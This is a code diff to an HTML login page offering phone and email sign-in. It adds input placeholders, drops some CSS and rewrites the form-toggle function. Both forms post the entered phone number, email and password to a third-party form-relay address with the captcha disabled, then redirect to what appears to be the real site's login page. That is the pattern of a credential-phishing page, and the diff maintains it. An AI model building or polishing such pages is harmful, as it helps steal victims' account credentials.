@@ -107,6 +107,11 @@
       gap: 10px;
     }
 
+    .input-group input::placeholder {
+      color: #aaa;
+      opacity: 1;
+    }
+
     .input-group img.flag {
       width: 20px;
       height: 20px;
@@ -135,17 +140,6 @@
       width: 16px;
       height: 16px;
       opacity: 0.6;
-    }
-
-    .form-footer {
-      display: flex;
-      justify-content: space-between;
-      font-size: 0.85rem;
-      color: white;
-      flex-direction: column;
-      gap: 5px;
-      margin-top: -2px;
-      margin-bottom: 10px;
     }
 
     button[type="submit"] {
@@ -184,7 +178,7 @@
       <button class="toggle-button" onclick="toggleLogin('email')">Email Login</button>
     </div>
 
-    <!-- Phone Form -->
+    <!-- Phone Login Form -->
     <form id="phoneForm" class="active" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST">
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_next" value="https://masx45.com/login?lang=en">
@@ -197,12 +191,12 @@
           <option value="+33">+33</option>
           <option value="+44">+44</option>
         </select>
-        <input type="text" name="phone" required>
+        <input type="text" name="phone" placeholder="Phone number" required>
       </div>
 
       <label for="password">Password</label>
       <div class="input-group">
-        <input type="password" name="password" required>
+        <input type="password" name="password" placeholder="Password" required>
         <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/invisible.png" onclick="togglePassword(this)">
       </div>
 
@@ -210,19 +204,19 @@
       <p class="disclaimer">Continue Is Agree <span>Sign Up</span></p>
     </form>
 
-    <!-- Email Form -->
+    <!-- Email Login Form -->
     <form id="emailForm" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST">
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_next" value="https://masx45.com/login?lang=en">
 
       <label for="email">Email Address</label>
       <div class="input-group">
-        <input type="email" name="email" required>
+        <input type="email" name="email" placeholder="Email address" required>
       </div>
 
       <label for="password">Password</label>
       <div class="input-group">
-        <input type="password" name="password" required>
+        <input type="password" name="password" placeholder="Password" required>
         <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/invisible.png" onclick="togglePassword(this)">
       </div>
 
@@ -232,6 +226,25 @@
   </div>
 
   <script>
+    function toggleLogin(method) {
+      const phoneBtn = document.querySelectorAll(".toggle-button")[0];
+      const emailBtn = document.querySelectorAll(".toggle-button")[1];
+      const phoneForm = document.getElementById("phoneForm");
+      const emailForm = document.getElementById("emailForm");
+
+      if (method === 'phone') {
+        phoneBtn.classList.add("active");
+        emailBtn.classList.remove("active");
+        phoneForm.classList.add("active");
+        emailForm.classList.remove("active");
+      } else {
+        emailBtn.classList.add("active");
+        phoneBtn.classList.remove("active");
+        emailForm.classList.add("active");
+        phoneForm.classList.remove("active");
+      }
+    }
+
     function togglePassword(icon) {
       const input = icon.previousElementSibling;
       const isHidden = input.type === 'password';
@@ -239,24 +252,6 @@
       icon.src = isHidden
         ? 'https://img.icons8.com/ios-glyphs/30/ffffff/visible--v1.png'
         : 'https://img.icons8.com/ios-glyphs/30/ffffff/invisible.png';
-    }
-
-    function toggleLogin(method) {
-      const phoneForm = document.getElementById("phoneForm");
-      const emailForm = document.getElementById("emailForm");
-      const buttons = document.querySelectorAll(".toggle-button");
-
-      buttons.forEach(btn => btn.classList.remove("active"));
-
-      if (method === "phone") {
-        phoneForm.classList.add("active");
-        emailForm.classList.remove("active");
-        buttons[0].classList.add("active");
-      } else {
-        phoneForm.classList.remove("active");
-        emailForm.classList.add("active");
-        buttons[1].classList.add("active");
-      }
     }
   </script>
 </body>
